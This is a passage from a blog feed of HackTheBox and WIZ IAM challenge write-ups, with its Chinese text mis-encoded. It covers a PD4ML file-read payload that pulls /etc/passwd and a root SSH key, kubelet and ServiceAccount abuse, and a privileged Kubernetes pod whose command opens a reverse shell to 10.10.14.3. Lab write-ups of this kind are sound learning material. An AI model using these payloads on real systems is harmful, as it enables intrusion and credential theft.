æ–‡æ¡£ã€‚å®ƒå¯ä»¥åœ¨æœåŠ¡å™¨ç«¯è¿è¡Œï¼Œå¹¶ä¸”å…·æœ‰å¯é…ç½®çš„é¡µé¢å¸ƒå±€ã€åˆ†é¡µã€å­—ä½“åµŒå…¥ã€å›¾åƒå¤„ç†å’Œå…¶ä»–å„ç§åŠŸèƒ½ã€‚</p></blockquote><p>HackTricksæ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå¯ä»¥åˆ©ç”¨PD4MLè¯»æ–‡ä»¶</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_RRZu0jEXAp.png" alt=""></p><h3 id="PD4MLè¯»æ–‡ä»¶"><a href="#PD4MLè¯»æ–‡ä»¶" class="headerlink" title="PD4MLè¯»æ–‡ä»¶"></a>PD4MLè¯»æ–‡ä»¶</h3><p>è¿˜æ˜¯å›åˆ°index.phpè¿™æ®µä»£ç ï¼š</p><ol><li>åœ¨alertsè¡¨ä¸­ç­›é€‰titleå±æ€§ä¸ºRansomwareçš„é¡¹</li><li>å†™å…¥åˆ°files/random.htmlä¸­</li><li>é€šè¿‡PD4MLå°†files/random.htmlè½¬æˆPDF</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>require <span class="hljs-string">&#x27;vendor/autoload.php&#x27;</span>;<br>use Aws\DynamoDb\DynamoDbClient;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>]===<span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;action&quot;</span>]===<span class="hljs-string">&quot;get_alerts&quot;</span>) &#123;<br>                date_default_timezone_set(<span class="hljs-string">&#x27;America/New_York&#x27;</span>);<br>                <span class="hljs-variable">$client</span> = new DynamoDbClient([<br>                        <span class="hljs-string">&#x27;profile&#x27;</span> =&gt; <span class="hljs-string">&#x27;default&#x27;</span>,<br>                        <span class="hljs-string">&#x27;region&#x27;</span>  =&gt; <span class="hljs-string">&#x27;us-east-1&#x27;</span>,<br>                        <span class="hljs-string">&#x27;version&#x27;</span> =&gt; <span class="hljs-string">&#x27;latest&#x27;</span>,<br>                        <span class="hljs-string">&#x27;endpoint&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://localhost:4566&#x27;</span><br>                ]);<br><br>                <span class="hljs-variable">$iterator</span> = <span class="hljs-variable">$client</span>-&gt;getIterator(<span class="hljs-string">&#x27;Scan&#x27;</span>, array(<br>                        <span class="hljs-string">&#x27;TableName&#x27;</span> =&gt; <span class="hljs-string">&#x27;alerts&#x27;</span>,<br>                        <span class="hljs-string">&#x27;FilterExpression&#x27;</span> =&gt; <span class="hljs-string">&quot;title = :title&quot;</span>,<br>                        <span class="hljs-string">&#x27;ExpressionAttributeValues&#x27;</span> =&gt; array(<span class="hljs-string">&quot;:title&quot;</span>=&gt;array(<span class="hljs-string">&quot;S&quot;</span>=&gt;<span class="hljs-string">&quot;Ransomware&quot;</span>)),<br>                ));<br><br>                foreach (<span class="hljs-variable">$iterator</span> as <span class="hljs-variable">$item</span>) &#123;<br>                        <span class="hljs-variable">$name</span>=rand(1,10000).<span class="hljs-string">&#x27;.html&#x27;</span>;<br>                        file_put_contents(<span class="hljs-string">&#x27;files/&#x27;</span>.<span class="hljs-variable">$name</span>,<span class="hljs-variable">$item</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br>                &#125;<br>                passthru(<span class="hljs-string">&quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/<span class="hljs-variable">$name</span> 800 A4 -out files/result.pdf&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>?&gt;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å…ˆè¯•ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹</p><p>æŒ‰ç…§GPTçš„æŒ‡ç¤ºå…ˆåˆ›ä¸ªaltersè¡¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S  --key-schema AttributeName=title,KeyType=HASH  --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5<br><br></code></pre></td></tr></table></figure><p>å†™ä¸ªç¬¦åˆæ¡ä»¶çš„å†…å®¹è¿›å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item <span class="hljs-string">&#x27;&#123;&quot;title&quot;:&#123;&quot;S&quot;:&quot;Ransomware&quot;&#125;,&quot;data&quot;:&#123;&quot;S&quot;:&quot;&lt;html&gt;testtest&lt;/html&gt;&quot;&#125;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®index.php POSTæŒ‡å®šçš„æ•°æ®<code>action=get_alerts</code>å¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†æ–‡ä»¶ï¼Œä½†æ˜¯æƒ³è®¿é—®çš„æ—¶å€™åˆæ²¡äº†ï¼ˆåˆè¦æ‹¼æ‰‹é€Ÿäº†ï¼‰</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-KeybJ4_aZ.png" alt=""></p><p>åé¢å‘ç°altersè¡¨ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œæˆ‘ä»¬ç›´æ¥å†™ä¸ªè„šæœ¬å§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5<br>aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item <span class="hljs-string">&#x27;&#123;&quot;title&quot;:&#123;&quot;S&quot;:&quot;Ransomware&quot;&#125;,&quot;data&quot;:&#123;&quot;S&quot;:&quot;&lt;html&gt;testtest&lt;/html&gt;&quot;&#125;&#125;&#x27;</span><br>curl http://localhost:8000/index.php -d <span class="hljs-string">&#x27;action=get_alerts&#x27;</span><br>wget http://localhost:8000/files/result.pdf<br></code></pre></td></tr></table></figure><p>è¿™ä¸‹ç¡®å®å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ç”Ÿæˆçš„pdfäº†ï¼Œä¸‹é¢åˆ©ç”¨PD4MLè¯»æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item <span class="hljs-string">&#x27;&#123;&quot;title&quot;:&#123;&quot;S&quot;:&quot;Ransomware&quot;&#125;,&quot;data&quot;:&#123;&quot;S&quot;:&quot;&lt;html&gt;&lt;pd4ml:attachment src=&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>file:///etc/passwd<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; description=&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-built_in">test</span><span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; icon=&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span>Paperclip<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27;/&gt;&lt;/html&gt;&quot;&#125;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè¯»åˆ°äº†/etc/passwd</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_g-5DVbHYwu.png" alt=""></p><p>å…ˆçœ‹çœ‹<code>/root</code>ç›®å½•ä¸‹éƒ½æœ‰äº›å•¥</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_IP0ga8zRtI.png" alt=""></p><p>ç„¶åå¯ä»¥ç›´æ¥è¯» <code>/root/root.txt</code></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-VrMgIbJCr.png" alt=""></p><p>ä½†ä½œä¸ºHackerè¿˜æ˜¯å¾—GetShellï¼Œæˆ‘ä»¬ç›´æ¥è¯»<code>/root/.ssh/id_rsa</code>ä½¿ç”¨ç§é’¥ç™»å½•åˆ°root</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_DplixZulxI.png" alt=""></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>User Flagï¼šS3æœªæˆæƒ â‡’ ä¸Šä¼ WebShell â‡’ æ•°æ®åº“æ³„éœ²å¯†ç  â‡’ å¯†ç å¤ç”¨é€ƒé€¸åˆ°å®¿ä¸»æœº</p><p>Root Flagï¼šDynamoDBæœªæˆæƒ â‡’ bucket-appä»£ç æ³„éœ² â‡’ PD4MLæ–‡ä»¶è¯»å–</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
      <tag>Cloud Native Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SteamCloud-HackTheBox</title>
    <link href="/2023/08/21/SteamCloud-HackTheBox/"/>
    <url>/2023/08/21/SteamCloud-HackTheBox/</url>
    
    <content type="html"><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_KMRnTNwY9u.png" alt=""></p><p>å‘ç°äº†ä¸€äº›Kubernetesé›†ç¾¤çš„ç«¯å£å¯¹å¤–å¼€æ”¾</p><h4 id="kube-hunter"><a href="#kube-hunter" class="headerlink" title="kube-hunter"></a>kube-hunter</h4><p>ç›´æ¥ä¸Škube-hunterï¼Œè¿™é‡Œç¡®å®æ˜¯ä¸ªé¶åœºã€‚ä¸€å¤§å †æœªæˆæƒ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_aJLe4HyjyU.png" alt=""></p><h4 id="nuclei"><a href="#nuclei" class="headerlink" title="nuclei"></a>nuclei</h4><p>nucleiä¹Ÿå‘ç°äº†ä¸å°‘é—®é¢˜</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sWNq1Jv1q6.png" alt=""></p><h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><h4 id="kubeletctl"><a href="#kubeletctl" class="headerlink" title="kubeletctl"></a>kubeletctl</h4><p>kubeletå­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡kubeletctlè¿›è¡Œåˆ©ç”¨ã€‚</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_SJva2Ppu7s.png" alt=""></p><p>æŸ¥çœ‹å¯ä»¥RCEçš„Pod</p><p>nginxå’Œkube-proxy-vbcjcæ˜¯æ­£åœ¨è¿è¡Œçš„Pod</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_-f3kHgD1rq.png" alt=""></p><p>nginxç›´æ¥ä»¥rootæƒé™è¿è¡Œ</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_E6SN9qOLHZ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NH3qRHrKPS.png" alt=""></p><h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><h4 id="Kubernetes-ServiceAccount"><a href="#Kubernetes-ServiceAccount" class="headerlink" title="Kubernetes ServiceAccount"></a>Kubernetes ServiceAccount</h4><blockquote><p>å½“ Pod ä¸ API æœåŠ¡å™¨è”ç³»æ—¶ï¼ŒPod ä¼šè¢«è®¤è¯ä¸ºæŸä¸ªç‰¹å®šçš„ ServiceAccountï¼ˆä¾‹å¦‚ï¼š<code>default</code>ï¼‰ã€‚ åœ¨æ¯ä¸ª<a href="https://kubernetes.io/zh-cn/docs/concepts/overview/working-with-objects/namespaces/" title="åå­—ç©ºé—´">åå­—ç©ºé—´</a>ä¸­ï¼Œè‡³å°‘å­˜åœ¨ä¸€ä¸ª ServiceAccountã€‚</p><p>æ¯ä¸ª Kubernetes åå­—ç©ºé—´è‡³å°‘åŒ…å«ä¸€ä¸ª ServiceAccountï¼šä¹Ÿå°±æ˜¯è¯¥åå­—ç©ºé—´çš„é»˜è®¤æœåŠ¡è´¦å·ï¼Œ åä¸º <code>default</code>ã€‚å¦‚æœä½ åœ¨åˆ›å»º Pod æ—¶æ²¡æœ‰æŒ‡å®š ServiceAccountï¼ŒKubernetes ä¼šè‡ªåŠ¨å°†è¯¥åå­—ç©ºé—´ä¸­ åä¸º <code>default</code> çš„ ServiceAccount åˆ†é…ç»™è¯¥ Podã€‚</p></blockquote><p>å¦‚æœè¿™ä¸ªServiceAccountæƒé™è¿‡å¤§çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨</p><p>é€šå¸¸å¯ä»¥åœ¨è¿™å‡ ä¸ªç›®å½•å¯ä»¥æ”¶é›†åˆ°ServiceAccountçš„å‡­æ®ä¿¡æ¯ï¼š</p><ul><li>/run/secrets/kubernetes.io/serviceaccount</li><li>/var/run/secrets/kubernetes.io/serviceaccount</li><li>/secrets/kubernetes.io/serviceaccount</li></ul><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_scsyLwQfcR.png" alt=""></p><p>ç›®å½•ä¸­ä¼šåŒ…å«ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><ul><li>ca.crtï¼šè¿™æ˜¯æ£€æŸ¥kubernetesé€šä¿¡çš„caè¯ä¹¦</li><li>namespaceï¼šè¡¨ç¤ºå½“å‰å‘½åç©ºé—´</li><li>tokenï¼šåŒ…å«å½“å‰podçš„æœåŠ¡ä»¤ç‰Œ</li></ul><h4 id="ä½¿ç”¨kubectlè®¿é—®é›†ç¾¤"><a href="#ä½¿ç”¨kubectlè®¿é—®é›†ç¾¤" class="headerlink" title="ä½¿ç”¨kubectlè®¿é—®é›†ç¾¤"></a>ä½¿ç”¨kubectlè®¿é—®é›†ç¾¤</h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_nptAVC6X_o.png" alt=""></p><p>æŒºå¤šæ“ä½œåšä¸äº†çš„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_NioIEaPzEh.png" alt=""></p><p>æŸ¥çœ‹æƒé™</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZXaluW2m18.png" alt=""></p><p>ServiceAccountå­˜åœ¨åˆ›å»ºPodçš„æƒé™ï¼Œå¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªç‰¹æƒPodå®ç°é€ƒé€¸</p><p>è¿™ç§å°±å±äºServiceAccountè´¦æˆ·æƒé™è¿‡å¤§å¯¼è‡´é€ƒé€¸</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span> <br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx003</span><br>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">default</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx003</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx:1.14.2</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;/bin/bash&quot;</span>]<br>    <span class="hljs-attr">args:</span>  [<span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.3/8888 0&gt;&amp;1&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/mnt</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">hostfs</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hostfs</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>  <span class="hljs-attr">automountServiceAccountToken:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">hostNetwork:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºç‰¹æƒå®¹å™¨å¹¶åå¼¹shell</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_yWvGr8GwCE.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Tk33-Erk7w.png" alt=""></p><p>æˆ‘ä»¬æŠŠå®¿ä¸»æœºçš„<code>/</code>æŒ‚è½½åˆ°<code>/mnt</code>äº†ï¼Œç›´æ¥æŸ¥çœ‹å³å¯è·å–flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_w3KwIxYfnw.png" alt=""></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ‰“èµ·æ¥å¾ˆæµç•…çš„ä¸€ä¸ªé¶åœºï¼Œéå¸¸é€‚åˆKuberneteså®‰å…¨å…¥é—¨ï¼ˆè¿™ä¸ªä¼šå‘˜æ²¡ç™½èŠ±ï¼‰</p>]]></content>
    
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
      <tag>Cloud Native Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WIZ IAM Challenge</title>
    <link href="/2023/08/13/WIZ-IAM-Challenge/"/>
    <url>/2023/08/13/WIZ-IAM-Challenge/</url>
    
    <content type="html"><![CDATA[<p>å¾ˆæœ‰æ„æ€çš„æŒ‘æˆ˜ï¼Œæ”»å‡»å„ç§IAM Policyé”™è¯¯é…ç½®ã€‚ä¹‹å‰æ²¡æ‰“è¿‡awsï¼Œè¿™æ¬¡å­¦åˆ°ä¸å°‘æ–°å§¿åŠ¿ã€‚GPTå¸®äº†å¤§å¿™ï¼Œåœ¨ç†è§£IAM Policyå’ŒAWSæœåŠ¡åˆ©ç”¨ä¸Šå¤§å¤§æé«˜äº†æ•ˆç‡ã€‚</p><p>æ‚¨ä¹Ÿå¯ä»¥å°è¯•ï¼š<a href="https://bigiamchallenge.com/challenge">https://bigiamchallenge.com/challenge</a></p><h2 id="Buckets-of-Fun"><a href="#Buckets-of-Fun" class="headerlink" title="Buckets of Fun"></a>Buckets of Fun</h2><p>ç›´æ¥ç»™å‡ºäº†ä¸€ä¸ªBucketçš„Policy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;2012-10-17&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: <span class="hljs-string">&quot;s3:GetObject&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: <span class="hljs-string">&quot;s3:ListBucket&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span>,<br>            <span class="hljs-string">&quot;Condition&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;StringLike&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;s3:prefix&quot;</span>: <span class="hljs-string">&quot;files/*&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»ç­–ç•¥é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™ä¸ªå­˜å‚¨æ¡¶å…¬å¼€äº†<code>s3:ListBucket</code>å’Œ<code>s3:GetObject</code>æƒé™</p><p>ç›´æ¥è®¿é—®æ‹¿åˆ°flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-08-13%2015.27.12_slmM4DaK5-.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-08-13%2015.26.54_e1nsKVFFbb.png" alt=""></p><h2 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a><del>Google</del> Analytics</h2><p>è¿˜æ˜¯ç»™å‡ºäº†ä¸€ä¸ªIAM Policy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;2012-10-17&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>            <span class="hljs-string">&quot;Action&quot;</span>: [<br>                <span class="hljs-string">&quot;sqs:SendMessage&quot;</span>,<br>                <span class="hljs-string">&quot;sqs:ReceiveMessage&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="SQS"><a href="#SQS" class="headerlink" title="SQS"></a>SQS</h4><blockquote><p>äºšé©¬é€Šç®€å•é˜Ÿåˆ—æœåŠ¡ (Amazon SQS) æä¾›å®‰å…¨ã€è€ç”¨ä¸”å¯ç”¨çš„æ‰˜ç®¡é˜Ÿåˆ—ï¼Œä½¿æ‚¨å¯ä»¥é›†æˆå’Œåˆ†ç¦»åˆ†å¸ƒå¼è½¯ä»¶ç³»ç»Ÿå’Œç»„ä»¶ã€‚<a href="https://docs.amazonaws.cn/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-queue-tags.html" title="Amazon SQS æä¾›å¸¸è§ç»“æ„ï¼Œä¾‹å¦‚æ­»ä¿¡é˜Ÿåˆ—å’Œæˆæœ¬åˆ†é…æ ‡ç­¾ã€‚">Amazon SQS æä¾›å¸¸è§ç»“æ„ï¼Œä¾‹å¦‚æ­»ä¿¡é˜Ÿåˆ—å’Œæˆæœ¬åˆ†é…æ ‡ç­¾ã€‚</a>å®ƒæä¾›äº†é€šç”¨ Web æœåŠ¡ APIï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Amazon SDK æ”¯æŒçš„ä»»ä½•ç¼–ç¨‹è¯­è¨€è®¿é—®è¯¥APIã€‚</p></blockquote><p>è®©GPTå¿«é€Ÿç»™å‡ºä½¿ç”¨æ–¹æ³•ï¼š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZR-FZLfm0J.png" alt=""></p><p>æ¥æ”¶æ¶ˆæ¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dLHBJm0Tv2.png" alt=""></p><p>æ‹¿åˆ°flag</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2023-08-13%2020.11.14_VtKvWXJCWa.png" alt=""></p><h2 id="Enable-Push-Notifications"><a href="#Enable-Push-Notifications" class="headerlink" title="Enable Push Notifications"></a>Enable Push Notifications</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;Version&quot;</span>: <span class="hljs-string">&quot;2008-10-17&quot;</span>,<br>    <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;Statement1&quot;</span>,<br>    <span class="hljs-string">&quot;Statement&quot;</span>: [<br>        &#123;<br>            <span class="hljs-string">&quot;Sid&quot;</span>: <span class="hljs-string">&quot;Statement1&quot;</span>,<br>            <span class="hljs-string">&quot;Effect&quot;</span>: <span class="hljs-string">&quot;Allow&quot;</span>,<br>            <span class="hljs-string">&quot;Principal&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;AWS&quot;</span>: <span class="hljs-string">&quot;*&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Action&quot;</span>: <span class="hljs-string">&quot;SNS:Subscribe&quot;</span>,<br>            <span class="hljs-string">&quot;Resource&quot;</span>: <span class="hljs-string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span>,<br>            <span class="hljs-string">&quot;Condition&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;StringLike&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;sns:Endpoint&quot;</span>: <span class="hljs-string">&quot;*@tbic.wiz.io&quot;</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="SNS"><a href="#SNS" class="headerlink" title="SNS"></a>SNS</h4><blockquote><p>Amazon Simple Notiï¬cation Serviceï¼ˆAmazon SNSï¼‰ä»¥ä¸¤ç§æ–¹å¼å‘é€é€šçŸ¥ï¼šA2A å’Œ A2Pã€‚A2A åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿã€å¾®æœåŠ¡å’Œäº‹ä»¶é©±åŠ¨å‹æ— æœåŠ¡å™¨åº”ç”¨ç¨‹åºä¹‹é—´è¿›è¡Œé«˜ååé‡ã€åŸºäºæ¨é€çš„å¤šå¯¹å¤šæ¶ˆæ¯ä¼ 